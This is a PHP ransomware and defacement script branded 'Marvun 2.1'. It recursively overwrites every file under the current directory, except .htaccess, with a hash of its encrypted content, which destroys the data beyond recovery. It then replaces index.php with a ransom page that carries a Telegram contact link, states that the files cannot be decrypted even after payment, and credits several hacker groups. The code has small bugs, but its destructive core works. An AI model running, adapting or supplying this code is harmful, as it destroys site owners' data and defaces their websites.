<?php
$encryptionKey = "SatuDuaSembilanKasiann"; // Change this to your desired encryption key
// Function to encrypt a file
function encryptFile($fileName, $encryptionKey) {
    $fileContent = file_get_contents($fileName);
    $encryptedContent = hash_hmac('sha256', openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3'), encryptionKey, 0);
    file_put_contents($fileName, $encryptedContent);
}

// Encrypt all files in a directory
$excluded_files = ['.htaccess'];
function encryptDirectory($dir, $encryptionKey) {
  $files = scandir($dir);  // Get all files and directories in the specified directory
  foreach ($files as $file) {
    $filePath = $dir . '/' . $file;
    if (is_file($filePath)) {  // Check if it's a file
      if (!in_array($file, $excluded_files)) {  // Check against excluded files array
        encryptFile($filePath, $encryptionKey);  // Hypothetical encryption function (not provided)
      }
    } elseif ($file != '.' && $file != '..' && is_dir($filePath)) {  // Check if it's a subdirectory (excluding '.' and '..')
      encryptDirectory($filePath, $encryptionKey);  // Recursively call encryptDirectory for subdirectories
    }
  }
}

// Function to create glitch effect on text
function glitchText($text) {
    $glitchedText = '';
    for ($i = 0; $i < strlen($text); $i++) {
        $glitchedText .= '<span style="color: white; text-shadow: 0 0 2px #00FFFF, 0 0 5px #00FFFF, 0 0 10px #00FFFF, 0 0 20px #00FFFF, 0 0 30px #00FFFF, 0 0 40px #00FFFF, 0 0 55px #00FFFF, 0 0 75px #00FFFF;">' . $text[$i] . '</span>';
    }
    return $glitchedText;
}

// Main ransomware function
function ransomware($encryptionKey) {
    // Encrypt files in current directory
    encryptDirectory('.', $encryptionKey);
}

// Call the ransomware function
ransomware($encryptionKey);
$notes = '<!DOCTYPE html>
<html>
<head>
<title> Your Files Are Held Hostage </title>
<style>
	body {
		background-color: #000;
		color: #fff;
		font-family: sans-serif;
		text-align: center;
		position: center;
		p
	}

	h1 {
		font-size: 4em;
		text-shadow: 0 0 10px #f00;
		font-family: monospace;
	}

	p {
		font-size: 2em;
	}

	button {
		background-color: #f00;
		color: #000;
		border: none;
		padding: 10px 20px;
		border-radius: 5px;
		cursor: pointer;
		box-shadow: 0 0 5px #000;
	}

	.monospace-text {
		font-family: "Courier New", Courier, monospace;
		display: none; /* Mulai tersembunyi */
		size: 10px
	}
	
	.button2 {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        font-weight: bold;
        text-align: center;
        text-decoration: none;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        transition: background-color 0.3s;
    }
	
	.button2:hover {
        background-color: gray;
    }
</style>
</head>
<body>
<center>
<h1> Marvun 2.1 </h1>
<a href="https://t.me/MrSanZzXe"><button>Contact me.</button></a><br><br>
<span id="more" class="monospace-text">``What happend to my file?``: Your file are encrypted by Marvun 2.1 with many layer of encryption.<br>``Can i Decrypt my file?``: No. You can not decrypt your file. However, if you trying to decrypt it. will most likely create new problems<br>``If i send pay the ransomware, will it be decrypted?``: No, you can not decrypt the ransomware even you pay more than 1 BTC. Because this is a "real attack"<br><br>MrSanZz - JogjaXploit - ZaaXploit - Ganosec - Anon07 - GBAnon17 - ./Szt00Xploit - Mis.Style - Downfeal - JNE</span></p>

<!-- Tombol Read More -->
<button class="button2" onclick="toggleText()">Read More</button>

<!-- Script JavaScript untuk mengatur tampilan teks -->
<script>
    function toggleText() {
        var moreText = document.getElementById("more");
        if (moreText.style.display === "none") {
            moreText.style.display = "inline"; // Mengubah display menjadi untuk menampilkan teks
        } else {
            moreText.style.display = "none"; // Kembali menyembunyikan teks jika sudah ditampilkan
        }
    }
</script>
</center>
</body>
</html>
';
file_put_contents('index.php', $notes);
?>
